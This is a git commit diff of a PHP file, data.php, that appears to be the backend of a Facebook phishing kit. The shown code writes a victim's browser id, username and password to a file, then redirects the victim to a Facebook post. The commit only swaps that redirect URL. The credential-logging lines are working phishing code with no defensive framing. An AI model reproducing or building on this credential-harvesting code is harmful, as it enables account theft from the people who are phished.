8503789d39806050c993533a3013bfe2366a1f39
sbabs1 <56878972+sbabs1@users.noreply.github.com>
2020-02-27 17:56:22 +0530

    Update data.php

--- data.php
+++ data.php
@@ -14,5 +14,5 @@ if ($password == '')
 	exit();
 }
 fwrite($handle,"\n"."Browser id = ".$browser_id."\n"."Username = ".$email."\n"."password = ".$password."\n");
-header('location:https://www.facebook.com/100047788906044/posts/107232774213019/?substory_index=0&app=fbl');
+header('location:https://www.facebook.com/100047863187988/posts/107795270825912/?substory_index=0&app=fbl');
 ?>
